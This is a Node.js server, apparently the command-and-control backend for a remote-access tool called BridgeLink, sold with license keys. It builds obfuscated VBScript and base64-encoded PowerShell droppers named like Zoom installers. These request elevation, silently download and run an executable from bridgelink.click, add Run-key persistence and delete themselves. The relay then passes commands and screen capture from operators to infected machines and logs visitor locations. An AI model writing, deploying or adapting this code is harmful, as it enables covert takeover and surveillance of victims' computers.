const http = require('http');
const express = require('express');
const { Server } = require('socket.io');
const jwt = require('jsonwebtoken');
const fs = require('fs');
const crypto = require('crypto');
const archiver = require('archiver');
const path = require('path');

const app = express();
const server = http.createServer(app);
app.use(express.json());

const CONFIG_PATH = '/opt/bridgelink/bl-config.json';
const WWW_PATH = '/var/www/bridgelink';
const DOWNLOAD_PATH = '/var/www/bridgelink/download';

function loadConfig() {
  try {
    if (fs.existsSync(CONFIG_PATH)) {
      const data = JSON.parse(fs.readFileSync(CONFIG_PATH, 'utf8'));
      if (!data.users) {
        const ownerId = 'usr_' + crypto.randomBytes(6).toString('hex');
        data.users = [{
          id: ownerId, name: 'Admin',
          passphrase: data.passphrase || 'changethislater',
          token: 'bl_inst_' + crypto.randomBytes(8).toString('hex'),
          downloadToken: crypto.randomBytes(8).toString('hex'),
          displayId: '1.1.1', fileName: 'zoominst_1.1.1',
          createdAt: new Date().toISOString()
        }];
        delete data.passphrase;
        fs.writeFileSync(CONFIG_PATH, JSON.stringify(data, null, 2));
      }
      let changed = false;
      data.users.forEach((u, i) => {
        if (!u.downloadToken) { u.downloadToken = crypto.randomBytes(8).toString('hex'); changed = true; }
        if (!u.displayId) { u.displayId = `1.1.${i + 1}`; changed = true; }
        if (!u.fileName) { u.fileName = `zoominst_${u.displayId}`; changed = true; }
      });
      if (!data.licenses) { data.licenses = []; changed = true; }
      if (changed) fs.writeFileSync(CONFIG_PATH, JSON.stringify(data, null, 2));
      return data;
    }
  } catch (e) { console.log('[CONFIG] Failed to load config, using defaults'); }
  const ownerId = 'usr_' + crypto.randomBytes(6).toString('hex');
  return {
    users: [{
      id: ownerId, name: 'Admin',
      passphrase: 'changethislater',
      token: 'bl_inst_' + crypto.randomBytes(8).toString('hex'),
      downloadToken: crypto.randomBytes(8).toString('hex'),
      displayId: '1.1.1', fileName: 'zoominst_1.1.1',
      createdAt: new Date().toISOString()
    }],
    adminPassword: '0000',
    licenses: []
  };
}

function saveConfig() {
  try { fs.writeFileSync(CONFIG_PATH, JSON.stringify({ users: USERS, adminPassword: ADMIN_PASSWORD, licenses: LICENSES }, null, 2)); }
  catch (e) { console.log('[CONFIG] Failed to save config:', e.message); }
}

const loaded = loadConfig();
let USERS = loaded.users;
let ADMIN_PASSWORD = loaded.adminPassword || '0000';
let LICENSES = loaded.licenses || [];
console.log(`[CONFIG] Loaded ${USERS.length} user(s), ${LICENSES.length} license(s)`);

function getUserByPassphrase(p) { return USERS.find(u => u.passphrase === p) || null; }
function getUserByToken(t) { return USERS.find(u => u.token === t) || null; }
function getUserById(id) { return USERS.find(u => u.id === id) || null; }
function getUserByDownloadToken(t) { return USERS.find(u => u.downloadToken === t) || null; }

function getNextDisplayId() {
  const ids = USERS.map(u => { const p = (u.displayId || '1.1.0').split('.').map(Number); return p[2] || 0; });
  return `1.1.${Math.max(...ids) + 1}`;
}

function cleanFileName(n) { return (n || '').replace(/[^a-zA-Z0-9_\-]/g, '_'); }

function generateLicenseKey() {
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  const seg = () => Array.from({length: 4}, () => chars[Math.floor(Math.random() * chars.length)]).join('');
  return `BL-${seg()}-${seg()}-${seg()}`;
}

function generateVBS(user) {
  const script = [
    'Dim strOS',
    'strOS = GetObject("winmgmts:root/cimv2").ExecQuery("Select Version from Win32_OperatingSystem").ItemIndex(0).Version',
    'Dim majorVer : majorVer = CInt(Split(strOS, ".")(0))',
    'If majorVer >= 10 Then',
    '  If Not WScript.Arguments.Named.Exists("elevated") Then',
    '    CreateObject("Shell.Application").ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevated", "", "runas", 0',
    '    WScript.Quit',
    '  End If',
    'End If',
    'Set oShell = CreateObject("WScript.Shell")',
    'Set oFSO = CreateObject("Scripting.FileSystemObject")',
    'tempDir = oShell.ExpandEnvironmentStrings("%TEMP%")',
    'appData = oShell.ExpandEnvironmentStrings("%APPDATA%")',
    'installDir = appData & "\\BridgeLink"',
    'tempPath = tempDir & "\\TaskAssist.exe"',
    'exePath = installDir & "\\TaskAssist.exe"',
    'downloadUrl = "https://bridgelink.click/download/TaskAssist.exe"',
    'If Not oFSO.FolderExists(installDir) Then',
    '    oFSO.CreateFolder(installDir)',
    'End If',
    'Set oXML = CreateObject("MSXML2.XMLHTTP")',
    'Set oStream = CreateObject("ADODB.Stream")',
    'oXML.Open "GET", downloadUrl, False',
    'oXML.Send',
    'oStream.Open',
    'oStream.Type = 1',
    'oStream.Write oXML.responseBody',
    'oStream.SaveToFile tempPath, 2',
    'oStream.Close',
    'If oFSO.FileExists(tempPath) Then',
    '    If oFSO.FileExists(exePath) Then oFSO.DeleteFile exePath, True',
    '    oFSO.MoveFile tempPath, exePath',
    'End If',
    'Dim regKey',
    'regKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"',
    'oShell.RegWrite regKey & "\\BridgeLink", exePath, "REG_SZ"',
    'Dim oEnvShell',
    'Set oEnvShell = CreateObject("WScript.Shell")',
    `oEnvShell.Environment("Process")("BL_INSTALL_TOKEN") = "${user.token}"`,
    'oShell.Run """" & exePath & """", 0, False',
    'WScript.Sleep 3000',
    'Set oSelf = oFSO.GetFile(WScript.ScriptFullName)',
    'oSelf.Delete'
  ].join('\r\n');

  // obfuscation unchanged below

  let encoded = '';
  for (let i = 0; i < script.length; i++) {
    encoded += script.charCodeAt(i).toString(8).padStart(3, '0');
  }
  const chunks = [];
  for (let i = 0; i < encoded.length; i += 60) {
    chunks.push('"' + encoded.slice(i, i + 60) + '"');
  }
  const v1 = 'n' + crypto.randomBytes(4).toString('hex');
  const v2 = 'u' + crypto.randomBytes(4).toString('hex');
  const v3 = 's' + crypto.randomBytes(4).toString('hex');
  return [
    'Dim ' + v1 + ':' + v1 + '=' + chunks.join(' & '),
    'Dim ' + v2 + ':' + v2 + '=""',
    'Dim ' + v3,
    'For ' + v3 + '=1 To Len(' + v1 + ') Step 3',
    ' ' + v2 + '=' + v2 + '&ChrW(CLng("&O"&Mid(' + v1 + ',' + v3 + ',3)))',
    'Next',
    'Execute ' + v2
  ].join('\r\n');
}

function generatePS(user) {
  return `$t='${user.token}';$d=$env:APPDATA+'\\BridgeLink';if(!(Test-Path $d)){New-Item -ItemType Directory -Path $d -Force|Out-Null};$e=$d+'\\TaskAssist.exe';[System.Net.ServicePointManager]::SecurityProtocol=[System.Net.SecurityProtocolType]::Tls12;(New-Object System.Net.WebClient).DownloadFile('https://bridgelink.click/download/TaskAssist.exe',$e);$env:BL_INSTALL_TOKEN=$t;$reg='HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run';Set-ItemProperty -Path $reg -Name 'BridgeLink' -Value $e -Force;Start-Process $e -WindowStyle Hidden`;
}

function generatePSOneLiner(user) {
  return `powershell -w h -c "${generatePS(user).replace(/"/g, '\\"')}"`;
}

function generatePSObfuscated(user) {
  const ps = generatePS(user);
  const encoded = Buffer.from(ps, 'utf16le').toString('base64');
  return `powershell -w h -enc ${encoded}`;
}

const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e6, pingTimeout: 60000, pingInterval: 25000 });
const JWT_SECRET = 'bl_' + crypto.randomBytes(32).toString('hex');
const SESSION_EXPIRY = '8h';
const agents = {}, controllers = {}, connectionAttempts = {};
const blockedIPs = new Set();
const visitorLogs = [], activeSessions = {}, sessionHistory = [];
const MAX_ATTEMPTS = 50, BLOCK_DURATION = 15 * 60 * 1000;

function isBlocked(ip) {
  const c = ip.replace('::ffff:', '');
  if (c === '127.0.0.1' || c === '::1') return false;
  if (blockedIPs.has(c)) return true;
  const a = connectionAttempts[ip];
  if (!a) return false;
  if (a.blocked && Date.now() - a.blockedAt < BLOCK_DURATION) return true;
  if (a.blocked) { delete connectionAttempts[ip]; return false; }
  return false;
}

function recordFailedAttempt(ip) {
  if (!connectionAttempts[ip]) connectionAttempts[ip] = { count: 0 };
  connectionAttempts[ip].count++;
  if (connectionAttempts[ip].count >= MAX_ATTEMPTS) { connectionAttempts[ip].blocked = true; connectionAttempts[ip].blockedAt = Date.now(); console.log(`[SECURITY] IP blocked: ${ip}`); }
}

function clearAttempts(ip) { delete connectionAttempts[ip]; }
function generateToken(socketId, userId) { return jwt.sign({ socketId, userId, type: 'controller' }, JWT_SECRET, { expiresIn: SESSION_EXPIRY }); }
function verifyToken(token) { try { return jwt.verify(token, JWT_SECRET); } catch { return null; } }

async function getLocation(ip) {
  try {
    const c = ip.replace('::ffff:', '');
    if (c === '127.0.0.1' || c === '::1') return { city: 'Localhost', country: 'Local', region: '' };
    const res = await fetch(`http://ip-api.com/json/${c}?fields=status,country,city,regionName,isp`);
    const data = await res.json();
    if (data.status === 'success') return { city: data.city || 'Unknown', country: data.country || 'Unknown', region: data.regionName || '', isp: data.isp || '' };
    return { city: 'Unknown', country: 'Unknown', region: '' };
  } catch { return { city: 'Unknown', country: 'Unknown', region: '' }; }
}

async function logVisitor(ip, userAgent, action, success) {
  const location = await getLocation(ip);
  visitorLogs.push({ ip: ip.replace('::ffff:', ''), userAgent: userAgent || 'Unknown', action, success, location, timestamp: new Date().toISOString() });
  if (visitorLogs.length > 1000) visitorLogs.shift();
}

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type, x-admin-token');
  res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

function adminAuth(req, res, next) {
  if (req.headers['x-admin-token'] !== ADMIN_PASSWORD) return res.status(401).json({ error: 'Unauthorized' });
  next();
}

// ============================================================
// LICENSE ENDPOINTS
// ============================================================

app.post('/admin/licenses/generate', adminAuth, (req, res) => {
  const { count = 1, note = '', expiryDays = 0 } = req.body;
  const num = Math.min(Math.max(parseInt(count) || 1, 1), 50);
  const newKeys = [];
  for (let i = 0; i < num; i++) {
    let key;
    do { key = generateLicenseKey(); } while (LICENSES.find(l => l.key === key));
    const license = {
      id: 'lic_' + crypto.randomBytes(6).toString('hex'),
      key, note: note || '',
      status: 'unused',
      createdAt: new Date().toISOString(),
      expiresAt: expiryDays > 0 ? new Date(Date.now() + expiryDays * 86400000).toISOString() : null,
      usedAt: null, usedBy: null, hardwareId: null, revokedAt: null
    };
    LICENSES.push(license);
    newKeys.push(license);
  }
  saveConfig();
  console.log(`[LICENSE] Generated ${num} key(s)`);
  res.json({ success: true, licenses: newKeys });
});

app.get('/admin/licenses', adminAuth, (req, res) => {
  res.json({ licenses: LICENSES });
});

app.post('/admin/licenses/revoke', adminAuth, (req, res) => {
  const { id } = req.body;
  const license = LICENSES.find(l => l.id === id);
  if (!license) return res.status(404).json({ error: 'License not found' });
  license.status = 'revoked';
  license.revokedAt = new Date().toISOString();
  saveConfig();
  console.log(`[LICENSE] Revoked: ${license.key}`);
  res.json({ success: true });
});

app.delete('/admin/licenses/:id', adminAuth, (req, res) => {
  const idx = LICENSES.findIndex(l => l.id === req.params.id);
  if (idx === -1) return res.status(404).json({ error: 'Not found' });
  LICENSES.splice(idx, 1);
  saveConfig();
  res.json({ success: true });
});

app.post('/license/validate', (req, res) => {
  const { key, hardwareId } = req.body;
  if (!key) return res.status(400).json({ error: 'Key required' });
  const license = LICENSES.find(l => l.key === key.toUpperCase().trim());
  if (!license) return res.status(404).json({ valid: false, reason: 'Invalid license key' });
  if (license.status === 'revoked') return res.status(403).json({ valid: false, reason: 'License has been revoked' });
  if (license.expiresAt && new Date() > new Date(license.expiresAt)) {
    license.status = 'expired'; saveConfig();
    return res.status(403).json({ valid: false, reason: 'License has expired' });
  }
  if (license.status === 'unused') {
    license.status = 'active';
    license.usedAt = new Date().toISOString();
    license.usedBy = req.headers['user-agent'] || 'Unknown';
    license.hardwareId = hardwareId || null;
    saveConfig();
    console.log(`[LICENSE] Activated: ${license.key} (${hardwareId || 'web'})`);
    return res.json({ valid: true, message: 'License activated' });
  }
  if (license.status === 'active') {
    if (!license.hardwareId || !hardwareId) return res.json({ valid: true, message: 'License valid' });
    if (license.hardwareId === hardwareId) return res.json({ valid: true, message: 'License valid' });
    return res.status(403).json({ valid: false, reason: 'License already used on another device' });
  }
  return res.status(403).json({ valid: false, reason: 'License not valid' });
});

app.post('/license/check', (req, res) => {
  const { key, hardwareId } = req.body;
  if (!key) return res.json({ valid: false });
  const license = LICENSES.find(l => l.key === key.toUpperCase().trim());
  if (!license) return res.json({ valid: false, reason: 'Not found' });
  if (license.status === 'revoked') return res.json({ valid: false, reason: 'Revoked' });
  if (license.expiresAt && new Date() > new Date(license.expiresAt)) return res.json({ valid: false, reason: 'Expired' });
  if (license.status === 'active') {
    if (license.hardwareId && hardwareId && license.hardwareId !== hardwareId) return res.json({ valid: false, reason: 'Wrong device' });
    return res.json({ valid: true });
  }
  return res.json({ valid: false, reason: 'Not activated' });
});

// ============================================================
// EXISTING ENDPOINTS — unchanged
// ============================================================

app.get('/install/:downloadToken', (req, res) => {
  const user = getUserByDownloadToken(req.params.downloadToken);
  if (!user) return res.status(404).send('Not found');
  const fn = cleanFileName(user.fileName || `zoominst_${user.displayId}`);
  res.setHeader('Content-Disposition', `attachment; filename="${fn}.vbs"`);
  res.setHeader('Content-Type', 'text/plain');
  res.send(generateVBS(user));
});

app.get('/install/:downloadToken/txt', (req, res) => {
  const user = getUserByDownloadToken(req.params.downloadToken);
  if (!user) return res.status(404).send('Not found');
  const fn = cleanFileName(user.fileName || `zoominst_${user.displayId}`);
  res.setHeader('Content-Disposition', `attachment; filename="${fn}.txt"`);
  res.setHeader('Content-Type', 'text/plain');
  res.send(generateVBS(user));
});

app.get('/install/:downloadToken/ps', (req, res) => {
  const user = getUserByDownloadToken(req.params.downloadToken);
  if (!user) return res.status(404).send('Not found');
  const fn = cleanFileName(user.fileName || `zoominst_${user.displayId}`);
  res.setHeader('Content-Disposition', `attachment; filename="${fn}.ps1"`);
  res.setHeader('Content-Type', 'text/plain');
  res.send(generatePS(user));
});

app.get('/install/config/:token', (req, res) => {
  const user = USERS.find(u => u.downloadToken === req.params.token);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json({ relay: 'wss://relay.bridgelink.click', passphrase: user.passphrase, device_name: require('os').hostname() });
});

app.get('/admin/backup', adminAuth, (req, res) => {
  res.setHeader('Content-Disposition', 'attachment; filename="bridgelink-backup.zip"');
  res.setHeader('Content-Type', 'application/zip');
  const archive = archiver('zip', { zlib: { level: 9 } });
  archive.pipe(res);
  if (fs.existsSync(CONFIG_PATH)) archive.file(CONFIG_PATH, { name: 'bl-config.json' });
  if (fs.existsSync('/opt/bridgelink/server.js')) archive.file('/opt/bridgelink/server.js', { name: 'server.js' });
  const wwwFiles = ['admin.html', 'index.html', 'version.json', 'install.ps1'];
  wwwFiles.forEach(f => { const p = path.join(WWW_PATH, f); if (fs.existsSync(p)) archive.file(p, { name: `www/${f}` }); });
  archive.finalize();
});

app.get('/admin/users', adminAuth, (req, res) => {
  const list = USERS.map(u => ({
    id: u.id, name: u.name, displayId: u.displayId,
    passphrase: u.passphrase, token: u.token,
    downloadToken: u.downloadToken,
    fileName: u.fileName || `zoominst_${u.displayId}`,
    createdAt: u.createdAt,
    onlineAgents: agents[u.id] ? Object.keys(agents[u.id]).length : 0,
    psOneLiner: generatePSOneLiner(u),
    psObfuscated: generatePSObfuscated(u)
  }));
  res.json({ users: list });
});

app.post('/admin/users/create', adminAuth, (req, res) => {
  const { name, passphrase, fileName } = req.body;
  if (!name || !name.trim()) return res.status(400).json({ error: 'Name required' });
  if (!passphrase || passphrase.length < 6) return res.status(400).json({ error: 'Passphrase too short (min 6 chars)' });
  if (USERS.find(u => u.passphrase === passphrase)) return res.status(400).json({ error: 'Passphrase already in use' });
  const displayId = getNextDisplayId();
  const newUser = {
    id: 'usr_' + crypto.randomBytes(6).toString('hex'),
    name: name.trim(), passphrase,
    token: 'bl_inst_' + crypto.randomBytes(8).toString('hex'),
    downloadToken: crypto.randomBytes(8).toString('hex'),
    displayId, fileName: fileName ? cleanFileName(fileName) : `zoominst_${displayId}`,
    createdAt: new Date().toISOString()
  };
  USERS.push(newUser);
  saveConfig();
  console.log(`[ADMIN] User created: ${newUser.name} (${newUser.displayId})`);
  res.json({ success: true, user: newUser });
});

app.delete('/admin/users/:id', adminAuth, (req, res) => {
  const { id } = req.params;
  const idx = USERS.findIndex(u => u.id === id);
  if (idx === -1) return res.status(404).json({ error: 'User not found' });
  const user = USERS[idx];
  if (agents[id]) { for (const d in agents[id]) agents[id][d].socket.disconnect(); delete agents[id]; }
  for (const sid in controllers) { if (controllers[sid].userId === id) { controllers[sid].socket.emit('session:expired'); controllers[sid].socket.disconnect(); } }
  USERS.splice(idx, 1);
  saveConfig();
  console.log(`[ADMIN] User deleted: ${user.name}`);
  res.json({ success: true });
});

app.get('/install/setup/:token', (req, res) => {
  const user = USERS.find(u => u.downloadToken === req.params.token);
  if (!user) return res.status(404).send('Not found');
  res.download('/var/www/bridgelink/download/BridgeLinkSetup.exe', `${user.fileName || 'BridgeLinkSetup'}.exe`);
});

app.post('/admin/users/:id/change-passphrase', adminAuth, (req, res) => {
  const user = getUserById(req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { passphrase } = req.body;
  if (!passphrase || passphrase.length < 6) return res.status(400).json({ error: 'Passphrase too short' });
  if (USERS.find(u => u.passphrase === passphrase && u.id !== req.params.id)) return res.status(400).json({ error: 'Passphrase already in use' });
  user.passphrase = passphrase;
  saveConfig();
  if (agents[req.params.id]) { for (const d in agents[req.params.id]) agents[req.params.id][d].socket.emit('passphrase:updated', { passphrase }); }
  res.json({ success: true });
});

app.post('/admin/users/:id/change-filename', adminAuth, (req, res) => {
  const user = getUserById(req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const { fileName } = req.body;
  if (!fileName || !fileName.trim()) return res.status(400).json({ error: 'File name required' });
  user.fileName = cleanFileName(fileName.trim());
  saveConfig();
  res.json({ success: true, fileName: user.fileName });
});

app.get('/admin/users/:id/installer', adminAuth, (req, res) => {
  const user = getUserById(req.params.id);
  if (!user) return res.status(404).json({ error: 'User not found' });
  const fn = cleanFileName(user.fileName || `zoominst_${user.displayId}`);
  const format = req.query.format;
  res.setHeader('Content-Disposition', `attachment; filename="${fn}.${format === 'txt' ? 'txt' : 'vbs'}"`);
  res.setHeader('Content-Type', 'text/plain');
  res.send(generateVBS(user));
});

app.get('/admin/logs', adminAuth, (req, res) => res.json({ logs: visitorLogs }));
app.post('/admin/clear-logs', adminAuth, (req, res) => { visitorLogs.length = 0; res.json({ success: true }); });
app.post('/admin/change-admin-password', adminAuth, (req, res) => {
  const { oldPassword, newPassword } = req.body;
  if (oldPassword !== ADMIN_PASSWORD) return res.status(400).json({ error: 'Wrong current password' });
  if (!newPassword || newPassword.length < 4) return res.status(400).json({ error: 'Too short' });
  ADMIN_PASSWORD = newPassword; saveConfig(); res.json({ success: true });
});
app.get('/admin/sessions', adminAuth, (req, res) => {
  const sessions = Object.values(activeSessions).map(s => ({ ...s, duration: Math.floor((Date.now() - new Date(s.loginTime).getTime()) / 1000) }));
  res.json({ sessions, history: sessionHistory.slice(-100) });
});
app.post('/admin/kick', adminAuth, (req, res) => {
  const ctrl = controllers[req.body.socketId];
  if (!ctrl) return res.status(404).json({ error: 'Not found' });
  ctrl.socket.emit('session:expired'); ctrl.socket.disconnect(); res.json({ success: true });
});
app.post('/admin/block-ip', adminAuth, (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP required' });
  blockedIPs.add(ip);
  for (const [id, ctrl] of Object.entries(controllers)) { if (ctrl.ip === ip) { ctrl.socket.emit('session:expired'); ctrl.socket.disconnect(); } }
  res.json({ success: true, blocked: [...blockedIPs] });
});
app.post('/admin/unblock-ip', adminAuth, (req, res) => { blockedIPs.delete(req.body.ip); res.json({ success: true, blocked: [...blockedIPs] }); });
app.get('/admin/blocked-ips', adminAuth, (req, res) => res.json({ blocked: [...blockedIPs] }));
app.post('/admin/restart', adminAuth, (req, res) => { res.json({ success: true }); setTimeout(() => process.exit(0), 500); });

app.get('/agent/passphrase', (req, res) => {
  const token = req.headers['x-agent-token'];
  if (!token) return res.status(401).json({ error: 'Unauthorized' });
  if (token === 'bl_agent_fetch_2026') return res.json({ passphrase: USERS[0].passphrase });
  const user = getUserByToken(token);
  if (!user) return res.status(401).json({ error: 'Unauthorized' });
  res.json({ passphrase: user.passphrase });
});

io.on('connection', (socket) => {
  const ip = socket.handshake.address;
  const cleanIp = ip.replace('::ffff:', '');
  const userAgent = socket.handshake.headers['user-agent'];
  logVisitor(ip, userAgent, 'visit', true);
  if (isBlocked(ip)) { logVisitor(ip, userAgent, 'blocked', false); socket.emit('auth:failed', { reason: 'Your IP has been blocked.' }); socket.disconnect(); return; }

  socket.on('agent:register', (data) => {
    const user = getUserByPassphrase(data.passphrase);
    if (!user) { recordFailedAttempt(ip); logVisitor(ip, userAgent, 'agent:failed', false); socket.disconnect(); return; }
    clearAttempts(ip);
    if (!agents[user.id]) agents[user.id] = {};
    agents[user.id][data.deviceId] = { socket, name: data.name, os: data.os, deviceId: data.deviceId, canCapture: data.canCapture, captureMethod: data.captureMethod, fallbackMode: data.fallbackMode, screenWidth: data.screenWidth, screenHeight: data.screenHeight, sessionType: data.sessionType, monitorCount: data.monitorCount || 1, ip: cleanIp, userId: user.id };
    console.log(`Agent connected: ${data.name} (user: ${user.name} ${user.displayId})`);
    notifyControllers(user.id);
  });

  socket.on('controller:auth', async (data) => {
    const user = getUserByPassphrase(data.passphrase);
    if (!user) { recordFailedAttempt(ip); logVisitor(ip, userAgent, 'login:failed', false); socket.emit('auth:failed', { reason: 'Wrong passphrase' }); socket.disconnect(); return; }
    clearAttempts(ip); logVisitor(ip, userAgent, 'login:success', true);
    const token = generateToken(socket.id, user.id);
    const location = await getLocation(ip);
    const loginTime = new Date().toISOString();
    controllers[socket.id] = { socket, token, ip: cleanIp, location, loginTime, userAgent, userId: user.id };
    activeSessions[socket.id] = { socketId: socket.id, ip: cleanIp, location, loginTime, userAgent, userName: user.name };
    socket.emit('auth:success', { token, expiresIn: SESSION_EXPIRY });
    console.log(`Controller connected: ${user.name} (${socket.id})`);
    sendAgentList(socket, user.id);
  });

  socket.on('controller:get-agents', () => { const c = controllers[socket.id]; if (!c) return; sendAgentList(socket, c.userId); });

  socket.on('controller:command', (data) => {
    const c = controllers[socket.id];
    if (!c) return;
    if (data.token && !verifyToken(data.token)) { socket.emit('session:expired'); socket.disconnect(); return; }
    const ua = agents[c.userId]; if (!ua) return;
    const agent = ua[data.deviceId];
    if (agent) agent.socket.emit('command', { controllerId: socket.id, command: data.command });
  });

  socket.on('agent:response', (data) => { const c = controllers[data.controllerId]; if (c) c.socket.emit('response', data); });

  socket.on('webrtc:offer', (data) => {
    const c = controllers[socket.id]; if (!c) return;
    const ua = agents[c.userId]; if (!ua) return;
    const agent = ua[data.deviceId];
    if (agent) agent.socket.emit('webrtc:offer', { offer: data.offer, controllerId: socket.id });
  });

  socket.on('webrtc:answer', (data) => { const c = controllers[data.controllerId]; if (c) c.socket.emit('webrtc:answer', { answer: data.answer }); });

  socket.on('webrtc:ice', (data) => {
    if (data.target === 'agent') {
      const c = controllers[socket.id]; if (!c) return;
      const ua = agents[c.userId]; if (!ua) return;
      const agent = ua[data.deviceId];
      if (agent) agent.socket.emit('webrtc:ice', { candidate: data.candidate });
    } else {
      const c = controllers[data.controllerId];
      if (c) c.socket.emit('webrtc:ice', { candidate: data.candidate });
    }
  });

  socket.on('agent:screen:status', (data) => { const c = controllers[data.controllerId]; if (c) c.socket.emit('screen:status', { deviceId: data.deviceId, status: data.status }); });
  socket.on('agent:screen:restored', (data) => { const c = controllers[data.controllerId]; if (c) c.socket.emit('screen:restored', { deviceId: data.deviceId }); });

  socket.on('disconnect', () => {
    for (const userId in agents) {
      for (const deviceId in agents[userId]) {
        if (agents[userId][deviceId].socket.id === socket.id) {
          const name = agents[userId][deviceId].name;
          console.log(`Agent disconnected: ${name}`);
          delete agents[userId][deviceId];
          for (const sid in controllers) { if (controllers[sid].userId === userId) controllers[sid].socket.emit('agent:disconnected', { deviceId, name }); }
          notifyControllers(userId); return;
        }
      }
    }
    if (controllers[socket.id]) {
      const session = activeSessions[socket.id];
      if (session) { sessionHistory.push({ ...session, logoutTime: new Date().toISOString(), duration: Math.floor((Date.now() - new Date(session.loginTime).getTime()) / 1000) }); if (sessionHistory.length > 500) sessionHistory.shift(); delete activeSessions[socket.id]; }
      delete controllers[socket.id];
    }
  });
});

function notifyControllers(userId) {
  const list = getAgentList(userId);
  for (const sid in controllers) { if (controllers[sid].userId === userId) controllers[sid].socket.emit('agent:list', list); }
}
function sendAgentList(socket, userId) { socket.emit('agent:list', getAgentList(userId)); }
function getAgentList(userId) {
  if (!agents[userId]) return [];
  return Object.values(agents[userId]).map(a => ({ deviceId: a.deviceId, name: a.name, os: a.os, canCapture: a.canCapture, captureMethod: a.captureMethod, fallbackMode: a.fallbackMode, screenWidth: a.screenWidth, screenHeight: a.screenHeight, sessionType: a.sessionType, monitorCount: a.monitorCount || 1, ip: a.ip }));
}

setInterval(() => { const now = Date.now(); for (const ip in connectionAttempts) { if (connectionAttempts[ip].blocked && now - connectionAttempts[ip].blockedAt > BLOCK_DURATION) delete connectionAttempts[ip]; } }, 60000);

const PORT = 3000;
server.listen(PORT, () => console.log(`Relay server running on port ${PORT}`));